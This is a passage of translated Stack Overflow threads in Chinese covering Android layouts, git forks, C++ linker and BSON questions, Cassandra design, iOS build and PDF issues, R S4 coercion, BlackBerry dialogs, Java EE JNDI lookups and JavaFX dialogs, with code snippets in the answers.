对于其他窥视者：如果由于项目要求而必须使用 GridLayout，请使用它，但我建议尝试使用 TableLayout，因为它似乎更容易使用并达到类似的结果。

文档：[https ://developer.android.com/reference/android/widget/TableLayout.html](https://developer.android.com/reference/android/widget/TableLayout.html)

例子：

```
<TableLayout
    android:layout_width="match_parent"
    android:layout_height="wrap_content">

    <TableRow>

        <Button
            android:id="@+id/test1"
            android:layout_width="wrap_content"
            android:layout_height="90dp"
            android:text="Test 1"
            android:drawableTop="@mipmap/android_launcher"
            />

        <Button
            android:id="@+id/test2"
            android:layout_width="wrap_content"
            android:layout_height="90dp"
            android:text="Test 2"
            android:drawableTop="@mipmap/android_launcher"
            />

        <Button
            android:id="@+id/test3"
            android:layout_width="wrap_content"
            android:layout_height="90dp"
            android:text="Test 3"
            android:drawableTop="@mipmap/android_launcher"
            />

        <Button
            android:id="@+id/test4"
            android:layout_width="wrap_content"
            android:layout_height="90dp"
            android:text="Test 4"
            android:drawableTop="@mipmap/android_launcher"
            />

    </TableRow>

    <TableRow>

        <Button
            android:id="@+id/test5"
            android:layout_width="wrap_content"
            android:layout_height="90dp"
            android:text="Test 5"
            android:drawableTop="@mipmap/android_launcher"
            />

        <Button
            android:id="@+id/test6"
            android:layout_width="wrap_content"
            android:layout_height="90dp"
            android:text="Test 6"
            android:drawableTop="@mipmap/android_launcher"
            />

    </TableRow>

</TableLayout> 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2020-05-15T07:50:22.747

[![网格布局](../Images/2725955ff7644242d7ab22e95ade7ab5.png)](https://i.stack.imgur.com/CL4SA.png)

```
 <GridLayout
        android:layout_width="match_parent"
        android:layout_weight="3"
        android:columnCount="2"
        android:padding="10dp"
        android:rowCount="3"
        android:background="@drawable/background_down"
        android:layout_height="0dp">

        <androidx.cardview.widget.CardView
            android:layout_height="0dp"
            android:layout_width="0dp"
            android:layout_columnWeight="1"
            android:layout_rowWeight="1"
            android:layout_margin="10dp"
            android:elevation="10dp"
            app:cardCornerRadius="15dp"
            >
            <LinearLayout
                android:weightSum="3"
                android:layout_width="match_parent"
                android:layout_height="match_parent"
                android:orientation="vertical"
                >

                <ImageView
                    android:layout_weight="2"
                    android:layout_width="50dp"
                    android:layout_height="50dp"
                    android:layout_margin="15dp"
                    android:src="@drawable/user" />

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Users"
                    android:textSize="16sp"
                    android:layout_marginStart="15dp"
                    android:layout_marginLeft="15dp" />
            </LinearLayout>

        </androidx.cardview.widget.CardView>
        <androidx.cardview.widget.CardView
            android:layout_height="0dp"
            android:layout_width="0dp"
            android:layout_columnWeight="1"
            android:layout_rowWeight="1"
            android:layout_margin="10dp"
            android:elevation="10dp"
            app:cardCornerRadius="15dp"
            >
            <LinearLayout
                android:weightSum="3"
                android:layout_width="match_parent"
                android:layout_height="match_parent"
                android:orientation="vertical"
                >

                <ImageView
                    android:layout_weight="2"
                    android:layout_width="50dp"
                    android:layout_height="50dp"
                    android:layout_margin="15dp"
                    android:src="@drawable/addusers" />

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Add Users"
                    android:textSize="16sp"
                    android:layout_marginStart="15dp"
                    android:layout_marginLeft="15dp" />
            </LinearLayout>

        </androidx.cardview.widget.CardView>

        <androidx.cardview.widget.CardView
            android:layout_height="0dp"
            android:layout_width="0dp"
            android:layout_columnWeight="1"
            android:layout_rowWeight="1"
            android:layout_margin="10dp"
            android:elevation="10dp"
            app:cardCornerRadius="15dp"
            >
            <LinearLayout
                android:weightSum="3"
                android:layout_width="match_parent"
                android:layout_height="match_parent"
                android:orientation="vertical"
                >

                <ImageView
                    android:layout_weight="2"
                    android:layout_width="50dp"
                    android:layout_height="50dp"
                    android:layout_margin="15dp"
                    android:src="@drawable/newspaper" />

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Report"
                    android:textSize="16sp"
                    android:layout_marginStart="15dp"
                    android:layout_marginLeft="15dp" />
            </LinearLayout>

        </androidx.cardview.widget.CardView>
        <androidx.cardview.widget.CardView
            android:layout_height="0dp"
            android:layout_width="0dp"
            android:layout_columnWeight="1"
            android:layout_rowWeight="1"
            android:layout_margin="10dp"
            android:elevation="10dp"
            app:cardCornerRadius="5dp"
            >
            <LinearLayout
                android:weightSum="3"
                android:layout_width="match_parent"
                android:layout_height="match_parent"
                android:orientation="vertical"
                >

                <ImageView
                    android:layout_weight="2"
                    android:layout_width="50dp"
                    android:layout_height="50dp"
                    android:layout_margin="15dp"
                    android:src="@drawable/settings" />

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Settings"
                    android:textSize="16sp"
                    android:layout_marginStart="15dp"
                    android:layout_marginLeft="15dp" />
            </LinearLayout>

        </androidx.cardview.widget.CardView>

    </GridLayout> 
```

完整的教程可以在这里找到。

```
[Android Grid Layout With CardView and OnItemClickListener][2] 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-01-12T08:33:14.297

将 match_parent 赋予膨胀的项目就可以了。GridLayout 将根据给定的列号自动划分最大父长度，并膨胀适合整个屏幕的那些项目。[![将 match_parent 赋予项目](../Images/f277458a17afc822714f988103411557.png)](https://i.stack.imgur.com/SNdO2.png)

* * *

## 回答 #10

> 赞同：-1
> 
> 时间：2014-06-04T03:55:19.543

你知道 View.getViewTreeObserver().addOnGlobalLayoutListener()

通过这个你可以计算尺寸。

我通过 GridView 实现了你的 UI 效果：

```
GridView g;
g.setNumColumns(2);
g.setStretchMode(GridView.STRETCH_SPACING_UNIFORM); 
```

# git - 分叉一个在 GitHub 中更新的存储库

> ID：10347855
> 
> 赞同：1
> 
> 时间：2012-04-27T09:07:10.807
> 
> 标签：git, github, fork

获取更新的存储库的最佳方法是什么？通常有一个按钮，上面写着“Fork”，但一个“Your Fork”按钮代替了它。这是因为我已经分叉了旧版本的存储库吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T09:43:36.213

您可以通过命令更新您的存储库

```
git fetch 
```

然后环顾四周并在必要时进行合并/变基。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T10:56:03.600

您应该将原始存储库作为源添加到本地 git 存储库

```
cd /my/local/repository
git remote add upstream git@github.com/author/originalrepo.git 
```

你可以选择任何你想要的名字，但我通常坚持使用上游。

您可以从`git pull upstream master`原始 repo 中获取 master 分支，合并更改并将其`git push origin master`推送到您的 fork

# c++ - 字符串和 int 的映射

> ID：10347857
> 
> 赞同：0
> 
> 时间：2012-04-27T09:07:17.470
> 
> 标签：c++, string, map

我想用 C++ 制作一个 DVD 出租应用程序。我已经制作了客户类的基础知识，以及另一个保存客户 ID 的类，称为 CustomerDB。每个客户都有一个唯一的 ID。
我想在继续程序之前测试 CustomerDB，但是在编译程序时出现错误。

这是我写的代码：

头文件：

```
// DVD_App.h - Header File

#include <string>
#include <map>

using namespace std;

enum Status {ACTIVE, INACTIVE};

class Customer {
    private:
        string id;
        string name;
        string address;
        Status status;

    public:
        Customer (const string&, const string&, const Status);
        string &getId () { return id; }
};

class CustomerDB {
    private:
        static map<string, int> idList;

    public:
        static void addNewToIdList (const string &threeLetterOfName) {
            if (!doesThreeLettersOfNameExist(threeLetterOfName))
                idList.insert(pair<string, int>(threeLetterOfName, 0));
        }

        static bool doesThreeLettersOfNameExist (const string &threeLetterOfName) {
            map<string, int>::iterator i = idList.find(threeLetterOfName);
            if ((i->first).compare(threeLetterOfName) != 0)
                return false;
            return true;
        }

        static int nextNumber (const string &threeLetterOfName) {
            map<string, int>::iterator i = idList.find(threeLetterOfName);
            ++(i->second);
            return i->second;
        }
}; 
```

和源代码文件：

```
// DVD_App.cpp - C++ Source Code

#include <iostream>
#include <string>
#include "DVD_App.h"

using namespace std;

Customer::Customer (const string &cName, const string &cAddress, const Status cStatus) : name(cName), address(cAddress), status(cStatus) {
    string threeLetters = name.substr(0, 3);
    if (CustomerDB::doesThreeLettersOfNameExist(threeLetters))
        threeLetters += "" + CustomerDB::nextNumber(threeLetters);
    else {
        CustomerDB::addNewToIdList(threeLetters);
        threeLetters += "0";
    }
}

int main () {
    Customer k ("khaled", "beirut", ACTIVE);
    cout << k.getId() << endl;

    return 0;
} 
```

我得到的错误是：

```
C:\Users\KiKo-SaMa\Desktop\C++>g++ DVD_App.cpp
C:\Users\KIKO-S~1\AppData\Local\Temp\ccSsS5HX.o:DVD_App.cpp:(.text$_ZN10Customer
DB14addNewToIdListERKSs[CustomerDB::addNewToIdList(std::basic_string<char, std::
char_traits<char>, std::allocator<char> > const&)]+0x59): undefined reference to
 `CustomerDB::idList'
C:\Users\KIKO-S~1\AppData\Local\Temp\ccSsS5HX.o:DVD_App.cpp:(.text$_ZN10Customer
DB27doesThreeLettersOfNameExistERKSs[CustomerDB::doesThreeLettersOfNameExist(std
::basic_string<char, std::char_traits<char>, std::allocator<char> > const&)]+0x1
0): undefined reference to `CustomerDB::idList'
C:\Users\KIKO-S~1\AppData\Local\Temp\ccSsS5HX.o:DVD_App.cpp:(.text$_ZN10Customer
DB10nextNumberERKSs[CustomerDB::nextNumber(std::basic_string<char, std::char_tra
its<char>, std::allocator<char> > const&)]+0x10): undefined reference to `Custom
erDB::idList'
collect2: ld returned 1 exit status 
```

我的程序有什么问题？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-27T09:10:56.520

您已声明静态变量 idList（在 .h 文件中），但未定义它（在 .cpp 文件中），例如

```
map<string, int> CustomerDB::idList;
int main () {
...
} 
```

# cassandra - Cassandra 模式设计可行性

> ID：10347858
> 
> 赞同：2
> 
> 时间：2012-04-27T09:07:17.510
> 
> 标签：cassandra

我正在为我的一个项目评估 cassandra，我很想知道具有数百万列族和数百万行的基本 cassandra 模式设计的可行性。每行的上限为 30,000 列。这是分布式 cassandra 集群（5-10 个节点）的可行设计，还是我遗漏了什么？

我也很想知道在一个事务中从单行中检索所有列的可行性。我想这样做的原因是在将它们返回给用户之前按它们的值对它们进行排序。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-01T04:39:39.113

数百万列族目前在 cassandra 中不可行。最近版本的上限是数千。此外，您描述的数据集（数百万 cfs x 数百万行）表明至少有 1 万亿行。当然，这取决于集群的具体情况，但是这个行数/数据量将需要比 5-10 个节点更大的集群。Cassandra 有很多中型节点，而不是非常大和强大的节点。

关于一次检索所有列，默认的最大请求大小为 15mb。这可以更改，但您几乎可以肯定不想更改它。您的查询很可能不应该接近最大请求，因为像这样的大型分配在 JVM 上很困难。是否有理由需要在单个事务中进行？您可以轻松地在几个请求中对一行进行分页，以获取所有列，然后在该点进行排序。

# c++ - C++ BSON 库如何从 c_str() 加载 bson？

> ID：10347859
> 
> 赞同：0
> 
> 时间：2012-04-27T09:07:21.853
> 
> 标签：c++, json, mongodb, bson

假设我们有一个包含二进制 bson 数据的字符串。如何将其加载到[bson 对象](http://www.mongodb.org/pages/viewpage.action?pageId=16646453)中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:18:29.237

我认为在同一页面上有一个例子可以做到这一点：

```
BSONObjBuilder b;
b << "name" << "Joe" << "age" << 33;
BSONObj p = b.obj(); 
```

也就是说，`BSONObjBuilder`有一个流操作符`const char *`。

[从文档](http://api.mongodb.org/cplusplus/current/classmongo_1_1_b_s_o_n_obj_builder.html)：

```
BSONObjBuilderValueStream & operator<< (const char *name)
Stream oriented way to add field names and values. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T10:01:17.797

尝试 BSONObj p(you_data_pointer);

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-01-10T22:19:49.727

对于原始 json 字符串，使用**mongo::fromjson**

```
mongo::BSONObj object = mongo::fromjson("{"Login":"test","Password":"12345","Role":["admin","manager"]}"); 
```

# ipad - 有没有其他方法可以设置背景图像以减少内存

> ID：10347863
> 
> 赞同：0
> 
> 时间：2012-04-27T09:07:42.697
> 
> 标签：ipad

当我设置 UIView 的背景图像时

```
[self.view setBackgroundColor:[UIColor colorWithPatternImage:[UIImage imageWithContentsOfFile:[[NSBundle mainBundle] pathForResource:@"mainScreenBackground" ofType:@"png"]]]]; 
```

它需要 6 MB 的内存。我想要另一种占用更少内存的方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:31:47.947

```
self.view.backgroundColor = [UIColor colorWithPatternImage:[UIImage imageNamed:@"image.png"]]; 
```

Does this work??

# r - 为什么不能将“S4”类型强制为“整数”类型的向量？

> ID：10347867
> 
> 赞同：4
> 
> 时间：2012-04-27T09:07:44.413
> 
> 标签：r, s4

谁能告诉我为什么会收到此错误：
`Error in as.integer(tm) : cannot coerce type 'S4' to vector of type 'integer`？
我一直在搜索互联网，但无法解决我的问题。

```
 library(Matrix)
     long <- file("C:\\New folder (5)\\inra.bin", "rb")
     A=readBin(long, integer(), size=2,n=67420*1, signed=F)
    ta<-t(A)
  lot <- file("C:\\New folder (5)\\lat.img", "rb")
    B=readBin(lot, integer(), size=2,n=67420*1, signed=F)
     tb<-t(B)
       wind <- file("C:\\Wind_WFD_200201.bin", "rb")
       C=readBin(wind, double(), size=4,n=67420*248, signed=TRUE)
        D<-matrix(C,nrow=248,ncol=67420)
         for(d in 1:31)
       {
        M <- Matrix(-9999, 360, 720)
         tm<-t(M)
       for(i in 1:67420)
       {
    tm[ta[i],tb[i]]= 10 * ((D[(d-1)*8+1,i] + D[(d-1)*8+2,i] +D[(d-1)*8+3,i] +D[(d- 1)*8+4,i] +D[(d-1)*8+5,i] +D[(d-1)*8+6,i] +D[(d-1)*8+7,i] +D[(d-1)*8+8,i] ) / 8)

 }###gooooooood
 to.write <- sprintf("C:\\Yar_%0d.bin", d)
 writeBin(as.integer(tm), size=2,to.write) 
```

}

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T11:26:14.050

看看[如何在 R 中拆分和写入 S4 对象的文件](https://stackoverflow.com/questions/8095595/how-to-split-and-write-to-a-file-for-s4-object-in-r)。在您的情况下，它似乎`Matrix`返回了一个 S4 对象。尝试这个：

```
foo <- Matrix(10,10,10)
slotnames(foo) 
```

这可能会就您要从`tm`对象中提取的内容提出建议。
但你为什么首先使用`Matrix`？如果你只是使用`base::matrix`这个问题应该会消失。编辑：查看包的文档`Matrix,`很明显`as.integer`不支持。您可能必须先使用`as(x,matrix)`。

# iphone - 在 iPhone 中将图像文本转换为其他语言

> ID：10347871
> 
> 赞同：2
> 
> 时间：2012-04-27T09:07:56.713
> 
> 标签：iphone, objective-c, ios

我可以在 iPhone/IPAD 中将英语、西班牙语、法语等图像文本转换为其他语言（印地语、西班牙语、日语、中文等）吗？有没有可能？？例子：-![在此处输入图像描述](../Images/e4b2e3b1fbe7d483714af70ad561630e.png)

我可以将此图像文本转换为其他语言，是否有任何 API 或 Web 服务可用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T14:34:07.957

您可以使用 OCR 引擎获取文本。

[从 ios 上的图像中获取文本（图像处理）](https://stackoverflow.com/questions/4538608/getting-text-from-image-on-ios-image-processing)

然后您可以将文本从一种语言翻译成任何其他语言。也许使用适用于 iOS 的 Google 翻译引擎完全有可能。它是免费的，但免费的翻译器对用户和好的应用程序来说是不方便的。你最好购买它并集成它，然后你的应用程序可以运行良好......

但恐怕你的图片文字大小不同......

# android - 如何接收应用程序已启动的通知？

> ID：10347875
> 
> 赞同：0
> 
> 时间：2012-04-27T09:08:18.250
> 
> 标签：android, android-activity

`startActivity`在我的应用程序中，我使用该方法启动了另一个活动（外部活动） 。我希望在启动第二个应用程序时收到通知，因此我可以使用`startActivityForResult`方法而不是`startActivity`方法。是否有其他机制来接收此类通知？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:29:24.700

你可以试试这个，在你调用第二个的地方在你的第一个活动中调用 startService。

startService(new Intent(this,NotificationService.class));

创建包含以下内容的 NotificationService.java：

```
package com.sample;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;

 import android.app.Notification;
   import android.app.NotificationManager;
   import android.app.PendingIntent;
   import android.app.Service;
   import android.content.Context;
  import android.content.Intent;

  import android.os.IBinder;
  import android.preference.PreferenceManager;
  import android.util.Log;
  import android.widget.Toast;
  public class NotificationService extends Service
   {
private final int UPDATE_INTERVAL = 10 * 1000;
private Timer timer = new Timer();  
private static final int NOTIFICATION_EX = 1;
private static final String TAG = "NotificationService";
private NotificationManager notificationManager;
ArrayList<HashMap<String, String>> currentForecast = new ArrayList<HashMap<String, String>>();

CharSequence tickerText="notifi";
public NotificationService(){}

public IBinder onBind1(Intent intent) {
    // TODO Auto-generated method stub
    return null;
}

@Override   
public void onCreate() {
  //code to execute when the service is first created

}   

@Override   
public void onDestroy() {   

    if (timer != null){
        timer.cancel();
    } 
}

@Override

public  int onStartCommand(final Intent intent, final int flags, final int startid) {  

    notificationManager = (NotificationManager) 
    getSystemService(Context.NOTIFICATION_SERVICE);

    int icon = R.drawable.iconToDisplayOnNotification;
    long when = System.currentTimeMillis();

    final Notification notification = new Notification(icon, tickerText, when);

    final Context context = getApplicationContext();
    final CharSequence contentTitle = "titleForNotification";
    final CharSequence contentText = "TextForNotification";
    Intent notificationIntent = new Intent(this, ActivityTobeCalledOnNotificationSelect.class);
    final PendingIntent contentIntent = PendingIntent.getActivity(this,0, notificationIntent, 0);

    notification.setLatestEventInfo(context, contentTitle,contentText, contentIntent);

    notificationManager.notify(NOTIFICATION_EX, notification);

    Toast.makeText(this, "Started!", Toast.LENGTH_LONG);
    timer.scheduleAtFixedRate(new TimerTask() {

        public void run() {
            // Check if there are updates here and notify if true
             Log.w(TAG,"run");
        }       

    }
,10, UPDATE_INTERVAL);

    return START_STICKY ;

}

@Override
public IBinder onBind(Intent intent) {
    // TODO Auto-generated method stub
    return null;
} 
```

}

# dialog - 我们可以在黑莓中使用单选按钮和复选框创建警报对话框吗

> ID：10347877
> 
> 赞同：0
> 
> 时间：2012-04-27T09:08:26.947
> 
> 标签：dialog, blackberry, alert

我想在黑莓中进行多`create a alert dialog with radiobuttons`选`or` `alert dialog with Checkboxes`的单选。在android中是可能的。但我想在黑莓中。我在google中搜索过。但我没有任何解决方案。请为这个问题提供任何建议r有用的链接。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-27T09:33:22.873

```
import net.rim.device.api.system.Bitmap;
import net.rim.device.api.ui.component.CheckboxField;
import net.rim.device.api.ui.component.Dialog;
import net.rim.device.api.ui.container.DialogFieldManager;

public class CheckboxInputDialog extends Dialog{

  private CheckboxField checkboxEditField;

  public CheckboxInputDialog(String choices[],int values[], String label){
    super(label, choices,values,Dialog.OK, Bitmap.getPredefinedBitmap(Bitmap.INFORMATION), Dialog.GLOBAL_STATUS);

    checkboxEditField  = new CheckboxField("Lablel",false);
    net.rim.device.api.ui.Manager delegate = getDelegate();
    if( delegate instanceof DialogFieldManager){
        DialogFieldManager dfm = (DialogFieldManager)delegate;
        net.rim.device.api.ui.Manager manager =dfm.getCustomManager();
        if( manager != null ){
            manager.insert(checkboxEditField, 0);
        }
    }

 }    

} 
```

现在按以下方式调用此对话框...

```
 String choices[] = { "OK", "CANCEL" };
    int values[] = { Dialog.OK, Dialog.CANCEL };
    CheckboxInputDialog d = new CheckboxInputDialog(choices,values,"Dialog Label");
    d.show(); 
```

输出将是：

![在此处输入图像描述](../Images/c68948e5cb8e064524928e0002729237.png)

获取 OK 和 Cancel 按钮的事件。

```
String choices[] = { "OK", "CANCEL" };
    int values[] = { Dialog.OK, Dialog.CANCEL };
    final CheckboxInputDialog d = new CheckboxInputDialog(choices, values,"Dialog Label");
    UiApplication.getUiApplication().invokeLater(new Runnable() {
        public void run() {
            int iResponse = d.doModal();
            if (iResponse == 0) {
                System.out.println("Press Ok");
            }else{
                System.out.println("Press Cancel");
            }
        }
    }); 
```

希望帮助满..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T09:21:20.190

创建 popupScreen 并在此屏幕中添加单选按钮和复选框。

```
public class Custom_Popup extends PopupScreen {

public Custom_Popup() {
    // TODO Auto-generated constructor stub
    super( new VerticalFieldManager(Manager.VERTICAL_SCROLL),
Field.NON_FOCUSABLE | Field.USE_ALL_WIDTH );

}

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T09:22:49.753

在您的活动中，按此屏幕。

```
UiApplication.getUiApplication().pushScreen(new MyPopup());

public class MyPopup extends PopupScreen{
public MyPopup() {
    super(new VerticalFieldManager(), Field.FOCUSABLE);
    add();//add checkbox , radio buttons here.
} 
```

# jakarta-ee - Java-EE6：从子项目调用无状态 bean 的正确方法是什么？

> ID：10347880
> 
> 赞同：0
> 
> 时间：2012-04-27T09:08:33.340
> 
> 标签：jakarta-ee, dependency-injection, jndi, session-bean

我的企业应用程序 (E-APP) 具有一个额外的类库项目 (CLP)，它充当我的 E-APP 和我的独立 Java SE 胖客户端之间的接口库（E-APP 引用 CLP 的内置 jar 文件） . 现在我需要调用驻留在我的 E-APP 中的会话 bean 的方法，但由于只有 E-APP 引用 CLP，我无权访问这些 bean 类。我将如何解决这个问题？进行 JNDI 远程调用，尽管 CLP 类作为 jar 文件驻留在应用程序服务器上？或者在这种情况下有没有办法使用依赖注入？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-24T08:22:14.350

无法对远程客户端使用依赖注入。使用 JNDI 查找对 bean 的引用解决了这个问题。这是一个例子：

```
PersonFacadeRemote personFacade = (PersonFacadeRemote)ctx.lookup("java:global/SuiteEE/SuiteEE-ejb/PersonFacade!ch.suite.control.PersonFacadeRemote"); 
```

其中 PersonFacadeRemote 是项目中的 @Remote 注释接口，由服务器和客户端组件引用。PersonFacade 在服务器上。

# iphone - 文件中缺少所需的架构 armv7？

> ID：10347882
> 
> 赞同：26
> 
> 时间：2012-04-27T09:08:38.190
> 
> 标签：iphone, objective-c, xcode4

我不断收到此警告和错误，有人可以帮忙吗？

```
 ld: warning: ignoring file /Applications/Xcode.app/Contents/Developer/Platforms       /iPhoneOS.platform/Developer/SDKs/iPhoneOS5.1.sdk/System/Library/Frameworks//SystemConfiguration.framework/SystemConfiguration, missing required architecture armv7 in file
    Undefined symbols for architecture armv7:
    "_SCNetworkReachabilityCreateWithAddress", referenced from:
  +[Reachability reachabilityWithAddress:] in Reachability.o
   "_SCNetworkReachabilityCreateWithName", referenced from:
  +[Reachability reachabilityWithHostName:] in Reachability.o
   "_SCNetworkReachabilityUnscheduleFromRunLoop", referenced from:
  -[Reachability stopNotifier] in Reachability.o
   "_SCNetworkReachabilityScheduleWithRunLoop", referenced from:
  -[Reachability startNotifier] in Reachability.o
   "_SCNetworkReachabilitySetCallback", referenced from:
  -[Reachability startNotifier] in Reachability.o
   "_SCNetworkReachabilityGetFlags", referenced from:
  -[Reachability connectionRequired] in Reachability.o
  -[Reachability currentReachabilityStatus] in Reachability.o
   ld: symbol(s) not found for architecture armv7
   clang: error: linker command failed with exit code 1 (use -v to see invocation) 
```

我的应用程序在模拟器中运行良好我没有得到这个，它只是在我构建到手机时。

* * *

## 回答 #1

> 赞同：65
> 
> 时间：2012-05-23T01:51:56.170

您需要链接到 SystemConfiguration 框架。在 Xcode 的项目导航器中选择您的项目，选择您的应用程序目标，然后选择 Build Phases 选项卡。在 Link Binary With Libraries 下，单击“+”按钮并选择 SystemConfiguration.framework。

您可能需要以相同的方式添加其他框架依赖项，但添加 SystemConfiguration 为我解决了相同的错误。

ETA：我直接跳到错误并没有在粘贴顶部看到 ld 警告。如果您已经链接到 SystemConfiguration，则可以尝试删除并重新添加它，如果一切都失败了，请更新 Xcode。最新版本肯定具有正确的架构，所以在我看来，要么是您的项目找错了地方，要么是框架本身有问题。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2018-03-04T13:32:36.707

当我包含一个使用 Carthage 构建的框架并且它的部署目标已设置为 iOS 11 但我正在为 iOS 9 构建时，发生在我身上。因此缺少 32 位架构（armv7、i386）。我已将该框架的部署目标更改为 iOS 9，这解决了我的问题。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2020-11-30T22:00:37.630

这个问题与 XCode 在尝试缩短构建时间重用旧文件时弄乱调试、配置文件和最终发布文件有关。

这就是缺少架构的原因（它可能与您已经使用的相反），因为 XCode 试图重用它为单一架构构建的一些以前的文件。

在 XCode (⇧ + ⌘ + K) 中清理您的项目，并尝试清理所有其他第三方库。之后，尝试直接以所需的发布模式重新构建您的应用程序。这工作 100% 次，无需重新启动 XCode。

XCode 很臭，我还能说什么？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-27T09:43:53.773

请确保添加所有必要的库来构建您的应用程序。这个错误似乎你错过了一些文件..

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-27T09:13:42.797

`Path => Project tittle(select Xcode blue color reject title) -> Build Setting -> ARCHS`如果您没有 armv7，请在此 ARCHS中的项目（）中添加军队，而不是添加它...

希望对你有帮助..

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-04-06T05:19:04.573

对于框架 Twilio Chat 客户端，我遇到了同样的问题。当我进入 carthage 文件夹并在其中打开 Twilio Chat 客户端框架的 Info.plist 文件时，最小部署目标设置为 11.0，但我正在为 10.0 开发应用程序，因此它缺少这些架构。

我是如何解决的：我将我的 Twilio Chat Client 框架降级到早期版本，其中部署目标设置为 9.0 并且可以正常工作。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2012-04-27T09:58:10.993

转到单击项目图标-> 目标-> 构建设置-> 体系结构

点击 -> 其他 + 并在指定列中添加 armv6..​​.

清理和构建

# multithreading - 创建 JavaFX 对话框

> ID：10347883
> 
> 赞同：0
> 
> 时间：2012-04-27T09:08:38.957
> 
> 标签：multithreading, javafx, dialog

我正在编写一个 javafx 程序，我需要创建和使用我自己的基于舞台 (Javafx.Stage) 的对话框来显示消息和确认。我现在已经编写了所有必要的代码，但我有一个问题：

对话框必须停止执行其余代码，直到给出“是”或“否”或“重试”之类的响应。当我使用像“DialogBox.ShowMessage”这样的对话框时，会出现一个带有消息和按钮的阶段。但是，正如您可能认为的那样，其余代码继续执行。我怎样才能解决这个问题？当我创建阶段时，它必须停止其他线程或它所依赖的线程。我已经通过互联网和这里搜索过，但我找不到确切的解决方案。一个想法是使用“javafx.event.EventDispatcher”或“javafx.event.EventDispatchChain”，但我不知道如何使用它们。另一个想法是使用“java.awt.EventQueue”。这里有一些可以提供帮助的东西：我可以控制舞台表演和隐藏事件以及显示或隐藏事件处理程序。

我希望我足够澄清情况。简而言之，我需要在使用我自己的代码的另一个阶段时管理线程。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:51:45.427

关于暂停执行有一个 Jira 问题[http://javafx-jira.kenai.com/browse/RT-19783](http://javafx-jira.kenai.com/browse/RT-19783)。
作为一种解决方法，我不知道如何使用 EventDispatcher 和 EventDispatchChain 来克服这个问题，但您可以将`EventHandler`s 作为参数发送。例如，

```
public static void ShowMessage(final EventHandler<ActionEvent> okAction, final EventHandler<ActionEvent> cancelAction){

   // Define and add buttons to the "view" and show message

   btnOk.setOnAction(new EventHandler<ActionEvent>() {
        public void handle(ActionEvent event) {
        okAction.handle(null);
        }
    });

   btnCancel.setOnAction(new EventHandler<ActionEvent>() {
        public void handle(ActionEvent event) {
        cancelAction.handle(null);
        }
    });
} 
```

并将其用作，

```
DialogBox.ShowMessage(
 new EventHandler<ActionEvent>() {
      @Override public void handle(ActionEvent arg0) {
        // Do stuff when "ok" clicked. 
},
 new EventHandler<ActionEvent>() {
      @Override public void handle(ActionEvent arg0) {
        // Do stuff when "cancel" clicked. 
}); 
```

我同意这是一种“缠绕”的方式。
Siteye hoş geldin ve kolay gelsin。

# iphone - 如何从 iPhone 中的 url 加载 pdf？

> ID：10347887
> 
> 赞同：1
> 
> 时间：2012-04-27T09:09:01.060
> 
> 标签：iphone

我有一个应用程序，我在其中通过使用从捆绑包中加载 pdf

```
CFURLRef pdfURL = CFBundleCopyResourceURL(CFBundleGetMainBundle(), CFSTR("hhhh.pdf"), NULL, NULL);. 
```

现在我想从我的网络服务器加载它。我使用字符串 url 完成了它

```
NSString *strUlr = [NSString stringWithFormat:@"https://s3.amazonaws.com/hgjgj.pdf"];

CFStringRef aCFString = (CFStringRef)strUlr;

//CFURLRef pdfURL = aCFString;
// NSURLRequest *requestObj = [NSURLRequest requestWithURL:url];

//pdf = CGPDFDocumentCreateWithURL((CFURLRef)pdfURL);

CFURLRef pdfURL = CFBundleCopyResourceURL(CFBundleGetMainBundle(),aCFString, NULL, NULL);
pdf = CGPDFDocumentCreateWithURL((CFURLRef)pdfURL);
   NSLog(@"%@",pdf);
//CFRelease(pdfURL); 
```

但没有成功..任何人都知道如何使这段代码工作。由于某些原因，我不需要将它加载到pdf中。有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:14:30.323

您仍然尝试获取应该在应用程序包中的资源的 url，而不是在远程服务器上。创建 url 的正确方法是 CFURLCreateWithString：

```
CFURLRef pdfURL = CFURLCreateWithString(NULL, aCFString, NULL); 
```

请记住，在显示之前下载您的 pdf 并将其缓存在本地可能会更好 - 这种方法还将为您提供更多的错误处理灵活性和可能的​​ url 身份验证挑战

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-21T05:06:07.680

如果我没记错的话，那么您可能想从 iPhone 中的网络服务器读取 pdf，如果是这样，那么您可以使用 UIWebView 来满足您的要求：这是您可以在本地读取和存储它的方法：

首先创建 UIWebView 并包含 << **UIWebViewDelegate** >>

```
 NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask, YES);
